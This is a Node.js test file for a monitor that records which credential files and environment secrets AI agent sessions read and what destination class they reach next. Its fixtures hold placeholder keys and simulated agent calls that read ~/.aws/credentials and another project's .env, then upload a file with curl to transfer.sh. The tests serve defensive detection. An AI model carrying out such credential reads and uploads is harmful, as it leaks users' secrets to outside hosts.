// F13 credential exposure map (cli/credential-exposure.mjs): which credential CLASSES an agent session can
// reach, which it read, and the destination class it reached next. Content-free: no path, no value, no
// profile or context name, no custom env name ever appears in the field.
//
//   node --test test/credential-exposure.test.mjs
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, statSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { rmTree } from "./fs-cleanup.mjs";
import {
  credentialInventory, credentialExposure, noteCredentialCall, fitPostureBody, destClassFor,
  EXPOSURE_FILE, EXPOSURE_KEEP, POSTURE_FIT_LIMIT, MAX_ITEMS, MAX_ENV_NAMES, MAX_HOSTS, KINDS
} from "../cli/credential-exposure.mjs";

const SECRET = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";
const NOW = Date.parse("2026-10-21T10:30:00Z");

function fixture(t) {
  const home = mkdtempSync(join(tmpdir(), "moorai-credexp-"));
  t.after(() => rmTree(home));
  const proj = join(home, "work", "proj");
  const other = join(home, "work", "other");
  const w = (rel, body) => { const p = join(home, rel); mkdirSync(join(p, ".."), { recursive: true }); writeFileSync(p, body); return p; };
  w(".aws/credentials", `[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE\naws_secret_access_key = ${SECRET}\n`);
  w(".aws/config", "[profile prod-admin]\nregion = us-east-1\n[profile dev]\nregion = eu-west-1\n");
  w(".ssh/id_ed25519", "-----BEGIN OPENSSH PRIVATE KEY-----\nAAAA\n-----END OPENSSH PRIVATE KEY-----\n");
  w(".ssh/id_ed25519.pub", "ssh-ed25519 AAAA test\n");
  w(".kube/config", "apiVersion: v1\ncontexts:\n- name: staging-west\n  context: {cluster: c1}\ncurrent-context: staging-west\n");
  w(".npmrc", "//registry.npmjs.org/:_authToken=npm_SECRETSECRETSECRET\n");
  w(".config/gh/hosts.yml", "github.com:\n  oauth_token: gho_SECRETSECRET\n");
  w(".netrc", "machine example.com login a password b\n");
  w(".cursor/mcp.json", JSON.stringify({ mcpServers: { db: { command: "x", env: { DB_PASSWORD: "hunter2", LOG_LEVEL: "info" } } } }));
  w("work/proj/.env", "STRIPE_KEY=sk_live_SECRET\n");
  w("work/proj/.env.example", "STRIPE_KEY=\n");
  w("work/other/.env", "X=1\n");
  return { home, proj, other };
}
const ENV = { PATH: "/usr/bin", AWS_ACCESS_KEY_ID: "AKIAIOSFODNN7EXAMPLE", GITHUB_TOKEN: "ghp_x", ACME_BILLING_DB_PASSWORD: "p", EDITOR: "vim" };
const noKeys = () => [];
const find = (items, kind, locationClass, scope) => items.find((i) => i.kind === kind && i.locationClass === locationClass && (!scope || i.scope === scope));

test("INVENTORY: fixed home-config, project-file, env and mcp-config locations, by class only", (t) => {
  const f = fixture(t);
  const items = credentialInventory({ home: f.home, env: ENV, cwd: f.proj, keysAtRest: noKeys });
  for (const k of ["aws", "ssh", "kube", "npm", "gh", "netrc"]) {
    const it = find(items, k, "home-config", "home");
    assert.ok(it, `${k} home-config item`);
    assert.equal(it.reachable, true);
    assert.equal(it.keyHash, null);
  }
  assert.equal(find(items, "aws", "home-config").prodLike, true, "a profile NAME matched /prod/i");
  assert.equal(find(items, "kube", "home-config").prodLike, false);
  const env = find(items, "env", "project-file", "project");
  assert.ok(env, "the project's .env");
  assert.equal(items.filter((i) => i.locationClass === "project-file").length, 1, ".env.example is a template, never a credential file");
  assert.ok(find(items, "mcp-config", "mcp-config", "home"), "a credential-shaped key in an MCP client config");
  const awsEnv = find(items, "aws", "env", "env");
  assert.deepEqual(awsEnv.envNames, ["AWS_ACCESS_KEY_ID"]);
  assert.deepEqual(find(items, "gh", "env", "env").envNames, ["GITHUB_TOKEN"]);
  const other = find(items, "env", "env", "env");
  assert.equal(other.envOtherCount, 1, "a custom credential-shaped name is counted");
  assert.deepEqual(other.envNames, []);
  for (const i of items) assert.ok(KINDS.includes(i.kind), i.kind);
  const raw = JSON.stringify(items);
  for (const leak of [f.home, f.proj, SECRET, "prod-admin", "staging-west", "ACME_BILLING_DB_PASSWORD", "DB_PASSWORD", "hunter2", "npm_SECRET", "gho_SECRET", "sk_live", "AKIAIOSFODNN7EXAMPLE", "ghp_x"]) assert.ok(!raw.includes(leak), `leaked ${leak}`);
});

test("INVENTORY: ai keys at rest come from the existing keys-at-rest scan, keyHash only", (t) => {
  const f = fixture(t);
  const keysAtRest = () => [
    { provider: "anthropic", locationClass: "shell-rc", location: "~/.zshrc", keyHash: "h2:aaaa", path: join(f.home, ".zshrc") },
    { provider: "openai", locationClass: "dotenv", location: null, keyHash: "h2:bbbb", path: join(f.proj, ".env") },
    { provider: "openai", locationClass: "dotenv", location: null, keyHash: "h2:cccc", path: join(f.other, ".env") }
  ];
  const items = credentialInventory({ home: f.home, env: {}, cwd: f.proj, keysAtRest });
  const ai = items.filter((i) => i.kind === "ai-key");
  assert.deepEqual(ai.map((i) => [i.locationClass, i.scope, i.keyHash]).sort(), [["home-config", "home", "h2:aaaa"], ["project-file", "outside-project", "h2:cccc"], ["project-file", "project", "h2:bbbb"]]);
  assert.ok(!JSON.stringify(items).includes(f.other));
});

test("DEST CLASS: throwaway host, AI provider, private range, other", () => {
  assert.equal(destClassFor("transfer.sh"), "throwaway-host");
  assert.equal(destClassFor("api.anthropic.com"), "ai-provider");
  assert.equal(destClassFor("api.openai.com"), "ai-provider");
  assert.equal(destClassFor("10.20.1.5"), "private-range");
  assert.equal(destClassFor("192.168.1.1"), "private-range");
  assert.equal(destClassFor("example.com"), "other");
});

test("READS AND SENT-TO: reads by scope, and the destination class reached next in the same session within 10 minutes", (t) => {
  const f = fixture(t);
  const stateDir = join(f.home, ".moorai");
  const note = (tool, toolInput, extra = {}) => noteCredentialCall({ stateDir, tool, toolInput, cwd: f.proj, home: f.home, session: "h2:s1", host: "claude-code", now: NOW, ...extra });
  note("Read", { file_path: join(f.home, ".aws/credentials") });
  note("Bash", { command: "cat ../other/.env" }, { now: NOW + 1000 });
  note("Read", { file_path: ".env" }, { now: NOW + 2000 });
  note("Bash", { command: "ls -la" }, { now: NOW + 2500 });
  note("Bash", { command: "curl -T x https://transfer.sh/up" }, { now: NOW + 60_000 });
  note("WebFetch", { url: "https://api.anthropic.com/v1/messages" }, { session: "h2:other", now: NOW + 70_000 });
  note("Bash", { command: "curl http://10.20.0.9/" }, { now: NOW + 11 * 60_000 });
  note("Read", { file_path: join(f.home, ".aws/credentials") }, { host: "codex", session: "h2:s2", now: NOW + 3000 });
  const raw = readFileSync(join(stateDir, EXPOSURE_FILE), "utf8");
  assert.equal(statSync(join(stateDir, EXPOSURE_FILE)).mode & 0o777, 0o600);
  for (const leak of [f.home, f.proj, "transfer.sh", "10.20.0.9", "curl", "anthropic.com"]) assert.ok(!raw.includes(leak), `local file holds ${leak}`);

  const field = credentialExposure({ home: f.home, env: {}, cwd: f.proj, stateDir, now: NOW + 12 * 60_000, keysAtRest: noKeys });
  assert.equal(field.v, 1);
  assert.equal(field.coverage, "heuristic");
  assert.equal(field.truncated, false);
  assert.equal(field.window.to, "2026-10-21T11:00:00Z");
  assert.equal(field.window.from, "2026-10-20T11:00:00Z");
  const aws = find(field.items, "aws", "home-config", "home");
  assert.deepEqual(aws.byHost["claude-code"], { reads: 1, lastReadAt: "2026-10-21T10:00:00Z", outsideProjectReads: 0, sentTo: ["throwaway-host"] });
  assert.deepEqual(aws.byHost.codex, { reads: 1, lastReadAt: "2026-10-21T10:00:00Z", outsideProjectReads: 0, sentTo: [] });
  const out = find(field.items, "env", "project-file", "outside-project");
  assert.equal(out.byHost["claude-code"].outsideProjectReads, 1);
  assert.equal(out.reachable, false, "an item known only from a read is not a current stat");
  const proj = find(field.items, "env", "project-file", "project");
  assert.equal(proj.byHost["claude-code"].reads, 1);
  assert.equal(proj.reachable, true);
  assert.equal(field.items[0].byHost && Object.keys(field.items[0].byHost).length > 0, true, "items with reads sort first");
  const fraw = JSON.stringify(field);
  for (const leak of [f.home, f.proj, "h2:s1", "transfer.sh", "10.20.0.9"]) assert.ok(!fraw.includes(leak), `field holds ${leak}`);
});

test("READS: a read older than the window is not counted; non-credential calls write nothing", (t) => {
  const f = fixture(t);
  const stateDir = join(f.home, ".moorai");
  noteCredentialCall({ stateDir, tool: "Bash", toolInput: { command: "echo hi" }, cwd: f.proj, home: f.home, session: "s", host: "claude-code", now: NOW });
  assert.equal(existsSync(join(stateDir, EXPOSURE_FILE)), false);
  noteCredentialCall({ stateDir, tool: "Read", toolInput: { file_path: join(f.home, ".npmrc") }, cwd: f.proj, home: f.home, session: "s", host: "claude-code", now: NOW - 30 * 3600_000 });
  const field = credentialExposure({ home: f.home, env: {}, cwd: f.proj, stateDir, now: NOW, keysAtRest: noKeys });
  assert.deepEqual(find(field.items, "npm", "home-config").byHost, {});
});

test("BOUNDED: the local read log keeps at most EXPOSURE_KEEP entries after compaction, 0600", (t) => {
  const f = fixture(t);
  const stateDir = join(f.home, ".moorai");
  for (let i = 0; i < EXPOSURE_KEEP + 600; i++) noteCredentialCall({ stateDir, tool: "Read", toolInput: { file_path: join(f.home, ".netrc") }, cwd: f.proj, home: f.home, session: "s", host: "claude-code", now: NOW + i });
  const lines = readFileSync(join(stateDir, EXPOSURE_FILE), "utf8").split("\n").filter(Boolean);
  assert.ok(lines.length <= EXPOSURE_KEEP, `${lines.length} entries`);
  const field = credentialExposure({ home: f.home, env: {}, cwd: f.proj, stateDir, now: NOW + EXPOSURE_KEEP + 600, keysAtRest: noKeys });
  assert.ok(find(field.items, "netrc", "home-config").byHost["claude-code"].reads <= EXPOSURE_KEEP);
});

test("LIMITS: at most 64 items, 16 env names per item, 6 hosts per item", (t) => {
  const f = fixture(t);
  const env = {};
  for (const n of ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN", "AWS_PROFILE"]) env[n] = "x";
  const keys = Array.from({ length: 80 }, (_, i) => ({ provider: "openai", locationClass: "dotenv", location: null, keyHash: `h2:${i}`, path: join(f.other, `${i}`, ".env") }));
  const stateDir = join(f.home, ".moorai");
  for (const host of ["claude-code", "codex", "cursor", "gemini", "copilot", "droid", "windsurf", "cline"]) noteCredentialCall({ stateDir, tool: "Read", toolInput: { file_path: join(f.home, ".aws/credentials") }, cwd: f.proj, home: f.home, session: "s", host, now: NOW });
  const field = credentialExposure({ home: f.home, env, cwd: f.proj, stateDir, now: NOW, keysAtRest: () => keys });
  assert.ok(field.items.length <= MAX_ITEMS && MAX_ITEMS === 64);
  for (const i of field.items) assert.ok(i.envNames.length <= MAX_ENV_NAMES && Object.keys(i.byHost).length <= MAX_HOSTS);
  assert.equal(Object.keys(find(field.items, "aws", "home-config").byHost).length, 6);
  assert.equal(field.truncated, true, "items past the cap are reported as truncated");
});

test("FIT: an over-size heartbeat drops the lowest-priority items first, then the field; a small one is untouched", () => {
  const item = (n, reads) => ({ kind: "ai-key", locationClass: "project-file", scope: "outside-project", reachable: true, keyHash: `h2:${"a".repeat(60)}${n}`, envNames: [], envOtherCount: 0, prodLike: false, byHost: reads ? { "claude-code": { reads, lastReadAt: "2026-10-21T10:00:00Z", outsideProjectReads: 0, sentTo: [] } } : {} });
  const small = { user: "u", posture: { v: 1 }, credentialExposure: { v: 1, coverage: "heuristic", window: {}, items: [item(0, 1)], truncated: false } };
  assert.deepEqual(fitPostureBody(small), small);
  const items = [item(0, 3), ...Array.from({ length: 63 }, (_, i) => item(i + 1, 0))];
  const big = { user: "u", posture: { v: 1, pad: "x".repeat(9000) }, credentialExposure: { v: 1, coverage: "heuristic", window: {}, items, truncated: false } };
  const fit = fitPostureBody(big);
  assert.ok(Buffer.byteLength(JSON.stringify(fit)) <= POSTURE_FIT_LIMIT);
  assert.equal(fit.credentialExposure.truncated, true);
  assert.ok(fit.credentialExposure.items.length < 64 && fit.credentialExposure.items.length > 0);
  assert.equal(fit.credentialExposure.items[0].byHost["claude-code"].reads, 3, "the item with reads is kept");
  assert.equal(big.credentialExposure.items.length, 64, "the input is not mutated");
  const huge = { user: "u", posture: { pad: "x".repeat(16000) }, credentialExposure: { v: 1, items: [item(0, 1)], truncated: false } };
  assert.equal("credentialExposure" in fitPostureBody(huge), false, "dropped entirely when nothing fits");
});
